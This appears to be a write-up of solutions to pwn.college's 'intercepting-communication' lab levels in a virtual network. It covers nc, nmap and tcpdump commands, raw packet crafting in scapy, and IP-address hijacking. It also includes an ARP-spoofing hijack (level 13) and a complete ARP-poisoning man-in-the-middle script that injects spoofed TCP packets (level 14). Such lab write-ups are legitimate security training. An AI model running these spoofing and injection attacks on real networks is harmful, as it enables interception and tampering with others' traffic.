---
title: intercepting-communication
date: 2024-07-30 21:55:56
category: pwn.college
tags:
---

# challenges
## level1
> Connect to a remote host
```bash
nc 10.0.0.3 31337
```

## level2
> Listen for a connection from a remote host
```bash
nc -l -p 31337
```

## level3
> Find and connect to a remote host

The remote host is somewhere on the `10.0.0.0/24` subnetwork, listening on port `31337`.

```bash
nmap -v 10.0.0.0/24 -p 31337
```

## level4
> Find and connect to a remote host on a large network

The remote host is somewhere on the `10.0.0.0/16` subnetwork, listening on port `31337`.

```bash
nmap -v 10.0.0.0/16 -p 31337 -T5

65536 IP addresses (2 hosts up) scanned in 2612.03 seconds
```

## level5
> Monitor traffic from a remote host

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will monitor traffic from a remote host.
Your host is already receiving traffic on port `31337`.

```bash
tcpdump -A
```

## level6
> Monitor slow traffic from a remote host

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will monitor slow traffic from a remote host.
Your host is already receiving traffic on port `31337`.

```bash
tcpdump -Q in "tcp[tcpflags]&tcp-push!=0" -X -q -l | grep 0x0030
```

or you can use wireshark


## level7
> Hijack traffic from a remote host by configuring your network interface

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will hijack traffic from a remote host by configuring your network interface.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

```bash
ip addr add 10.0.0.2/16 dev eth0

nc -l 31337
```

## level8
> Manually send an Ethernet packet

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will manually send an Ethernet packet.
The packet should have `Ether type=0xFFFF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
scpay

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'06:3f:d7:4f:63:40'
>>> pk=Ether(src="06:3f:d7:4f:63:40",dst="ff:ff:ff:ff:ff:ff",type=0xFFFF)
>>> srp(pk,iface="eth0")
```

## level9
> Manually send an Internet Protocol packet

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will manually send an Internet Protocol packet.
The packet should have `IP proto=0xFF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'd6:8e:5a:63:78:a2'
>>> pk=Ether(src="d6:8e:5a:63:78:a2",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3",proto=0xff)
>>> srp(pk1)
```

## level10
> Manually send a Transmission Control Protocol packet

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will manually send a Transmission Control Protocol packet.
The packet should have `TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'96:14:00:18:e9:96'
>>> pk=Ether(src="96:14:00:18:e9:96",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31337,ack=31337,flags='APRSF')
>>> srp(pk,iface='eth0')
```

## level11
> Manually perform a Transmission Control Protocol handshake

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will manually perform a Transmission Control Protocol handshake.
The initial packet should have `TCP sport=31337, dport=31337, seq=31337`.
The handshake should occur with the remote host at `10.0.0.3`.

```python
scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'42:f4:f8:57:fa:a4'
>>> pk1=Ether(src="42:f4:f8:57:fa:a4",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31337,flags='S')
>>> response=srp(pk1,iface='eth0')
>>> response[0][0]
QueryAnswer(query=<Ether  dst=ff:ff:ff:ff:ff:ff src=42:f4:f8:57:fa:a4 type=IPv4 |<IP  frag=0 proto=6 src=10.0.0.2 dst=10.0.0.3 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>, answer=<Ether  dst=42:f4:f8:57:fa:a4 src=be:9b:98:0e:32:27 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=6 chksum=0x66cb src=10.0.0.3 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=3424417206 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0xcabd urgptr=0 |>>>)
>>> pk2=Ether(src="42:f4:f8:57:fa:a4",dst="be:9b:98:0e:32:27")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31338,ack=3424417207,flags='A')
>>> response1=srp(pk2,iface='eth0')

```

## level12
> Manually send an Address Resolution Protocol packet

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will manually send an Address Resolution Protocol packet.
The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found.
The packet should be sent to the remote host at `10.0.0.3`.

```python
scapy

>>> get_if_hwaddr("eth0")
'5e:76:a7:a8:dc:75'
>>> pk=Ether(src="5e:76:a7:a8:dc:75",dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="5e:76:a7:a8:dc:75",psrc="10.0.0.2")
>>> srp(pk,iface='eth0')
```

## level13
> Hijack traffic from a remote host using ARP

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will hijack traffic from a remote host using ARP.
You do not have the capabilities of a NET ADMIN.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

```python
>>> get_if_hwaddr("eth0")
'8e:4b:78:5c:3c:6a'
>>> pk=Ether(src="8e:4b:78:5c:3c:6a",dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="8e:4b:78:5c:3c:6a",psrc="10.0.0.2",pdst="10.0.0.4")
>>> sendp(pk,iface="eth0")
>>> sniff(iface='eth0',filter='tcp[tcpflags]&tcp-push!=0',prn=hexdump) 

```

## level14
> Man-in-the-middle traffic between two remote hosts and inject extra traffic

In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will man in the middle traffic between two remote hosts and inject extra traffic.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.3` on port `31337`.

```python
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

interface = "eth0"
local_mac = get_if_hwaddr(interface)
local_ip = "10.0.0.2"
ip1 = "10.0.0.3"
ip2 = "10.0.0.4"

mac1=getmacbyip(ip=ip1)
mac2=getmacbyip(ip=ip2)

print(f"\033[1;32mlocal_mac:{local_mac}\033[0m")
print(f"\033[1;32mmac1:{mac1}\033[0m")
print(f"\033[1;32mmac2:{mac2}\033[0m")

eth=Ether(src=local_mac,dst="ff:ff:ff:ff:ff:ff")
arp1=ARP(op="is-at",hwsrc=local_mac,psrc=ip1,pdst=ip2)
arp2=ARP(op="is-at",hwsrc=local_mac,psrc=ip2,pdst=ip1)
sendp(eth/arp1,iface=interface)
sendp(eth/arp2,iface=interface)

def process(p:Packet):
    try:
        print("load:",p['TCP'].load)
        if p['TCP'].load==b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
            pdst = p['IP'].src
            psrc = p['IP'].dst
            flags = 'PA'
            ipflags = p['IP'].flags
            dst = p['Ethernet'].src
            dport = p['TCP'].sport
            sport = p['TCP'].dport
            seq = p['TCP'].ack
            ack = p['TCP'].seq+24
            pk = Ether(src=local_mac,dst=dst)/IP(src=psrc,dst=pdst,flags=ipflags)/TCP(sport=sport,dport=dport,seq=seq,ack=ack,flags=flags)/Raw(load=b"FLAG")
            sendp(pk,iface=interface)
    except Exception:
        pass
    
sniff(iface=interface,filter="tcp",prn=process)
```
